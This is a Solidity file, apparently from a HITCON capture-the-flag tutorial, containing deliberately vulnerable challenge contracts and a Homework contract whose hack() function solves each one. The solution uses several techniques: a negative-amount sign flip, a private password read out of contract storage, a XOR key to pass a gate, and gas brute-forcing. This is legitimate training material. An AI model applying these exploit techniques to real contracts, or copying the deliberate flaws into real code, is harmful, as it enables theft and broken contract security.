/**
 *Submitted for verification at Etherscan.io on 2022-08-19
*/

pragma solidity ^0.8.10;

contract Vuln0 {
  struct tutorial {
    bool knowPlayerAddress;
    bool knowContractAddress;
    bool knowUint;
  }

  mapping (address => tutorial) solverToTutorial;

  modifier winCondition() {
    require (solverToTutorial[tx.origin].knowPlayerAddress);
    require (solverToTutorial[tx.origin].knowContractAddress);
    require (solverToTutorial[tx.origin].knowUint);
    _;
  }

  function giveMeYourAddress(address _player) public {
    require (_player == tx.origin);
    solverToTutorial[tx.origin].knowPlayerAddress = true;
  }

  function giveMeContractAddress(address _contract) public {
    require (_contract == address(this));
    solverToTutorial[tx.origin].knowContractAddress = true;
  }

  function giveMeUint(uint _num) public {
    require (_num == 13371337);
    solverToTutorial[tx.origin].knowUint = true;
  }
}

pragma solidity ^0.8.10;

contract Vuln1 {
  mapping (address => bool) solverToHitcon;

  modifier winCondition() {
    require (solverToHitcon[tx.origin]);
    _;
  }

  function hitcon(uint _hitcon) public {
    require (_hitcon == uint(keccak256(abi.encodePacked("I love hitcon !!!!!!!!!"))));
    solverToHitcon[tx.origin] = true;
  }
}

contract Vuln2 {
  mapping (address => uint) solverToPoints;

  modifier winCondition() {
    require (solverToPoints[tx.origin] > 10000000000);
    _;
  }

  function getPoints() public view returns (uint) {
    return solverToPoints[tx.origin];
  }

  function addPoints(int _amount) public {
    require (_amount < 10);
    if (_amount >= 0) {
      solverToPoints[tx.origin] += uint(_amount);  
    } else {
      solverToPoints[tx.origin] += uint(-_amount);  
    }
  }
}


contract Vuln3 {
  bytes32 private password;
  mapping (address => bool) public solverToAuth;
  constructor(bytes32 _password) {
    password = _password;
  }

  modifier winCondition() {
    require (solverToAuth[tx.origin]);
    _;
  }

  function auth(bytes32 _password) public {
    if (password == _password) {
      solverToAuth[tx.origin] = true;
    }
  }
}


contract Vuln4 {
  mapping (address => bool) solverToSubmitted;

  modifier winCondition() {
    require (solverToSubmitted[tx.origin]);
    _;
  }

  function submit() public {
    Homework homework = Homework(msg.sender);
    require(homework.plus(15434, 23456543) ==  15434 + 23456543);
    require(homework.plus(987654356, 765456) ==  987654356 + 765456);
    require(homework.plus(7230987, 45654) ==  7230987 + 45654);
    require(homework.minus(987654345678, 8765456) ==  987654345678 - 8765456);
    require(homework.minus(12345, 6789) ==  12345 - 6789);
    require(homework.minus(98765432, 8765432) ==  98765432 - 8765432);

    solverToSubmitted[tx.origin] = true;
  }
}
contract Vuln5 {
    mapping(address => bool) public crackerList;

    modifier winCondition() {
        require(crackerList[tx.origin] == true);
        _;
    }

    modifier contractGate() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gasGate() {
        require((gasleft() % 22) == 0);
        _;
    }

    modifier keyGate(bytes8 _gateKey) {
        unchecked {
            require(
                uint64(uint160(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1
            );
        }
        _;
    }

    function crack(bytes8 _gateKey)
        public
        contractGate
        gasGate
        keyGate(_gateKey)
    {
        crackerList[tx.origin] = true;
    }
}

interface Winner {
    function win() external ;
}

contract Homework {
    function plus(uint a, uint b) public pure returns (uint) {
        return a+b;
    }

    function minus(uint a, uint b) public pure returns (uint) {
        return a-b;
    }

    function hack() public {
        Vuln0 c0=Vuln0(0x517B092929fA1063A2885B682D2198913E440694);
        Vuln1 c1=Vuln1(0xb17a7E3048334EadB7E0a41E1CCD4C71dE55B85b);
        Vuln2 c2=Vuln2(0x731990D7094b36235186d556E772003F3E3e239C);
        Vuln3 c3=Vuln3(0xeb1E1FA6Af14E8dF0Ab8fcf08D27BC0557969b55);
        Vuln4 c4=Vuln4(0x68aAcC461F11B0185737eFa66287FBaC1Fef889d);
        address c5=address(0x30A9468f3ae1B49F5Cd0d79651170D02a8444ABA);
        // // Challenge 0
        c0.giveMeYourAddress(msg.sender);
        c0.giveMeContractAddress(address(c0));
        c0.giveMeUint(13371337);
        Winner(address(c0)).win();

        // // Challenge 1
        c1.hitcon(uint(keccak256(abi.encodePacked("I love hitcon !!!!!!!!!"))));
        Winner(address(c1)).win();

        // // Challenge 2
        c2.addPoints(-100000000000);
        Winner(address(c2)).win();

        // // Challenge 3
        c3.auth(0x686974636f6e5f69735f766572795f676f6f645f4c4c4c4c4c4f4c4c4c4c4c00);
        Winner(address(c3)).win();

        // // Challenge 4
        c4.submit();
        Winner(address(c4)).win();
        
        // // Challenge 5
        bytes8 key;
        unchecked {
            key = bytes8(uint64(uint160(address(this)))^uint64(uint64(0)-1));
        }
        
        for(uint i=0 ; i<=22 ; i++) {
            (bool success, ) = c5.call{gas: i + 1000000}(
                abi.encodeWithSignature("crack(bytes8)", key)
            );

            if (success) {
                break;
            }
        }
        Winner(address(c5)).win();
    }
}